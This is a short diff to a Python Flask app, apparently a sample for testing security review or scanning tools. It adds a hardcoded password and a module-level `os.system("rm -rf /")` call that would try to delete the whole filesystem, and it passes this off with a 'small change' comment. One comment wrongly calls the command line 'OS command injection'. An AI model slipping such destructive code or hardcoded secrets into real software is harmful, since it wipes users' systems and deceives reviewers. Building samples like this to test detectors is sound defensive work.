@@ -13,3 +13,6 @@ def home():
 
 if __name__ == '__main__':
     app.run(debug=True)
+password = "admin123"  # Hardcoded secret
+os.system("rm -rf /")  # OS command injection
+#small change 
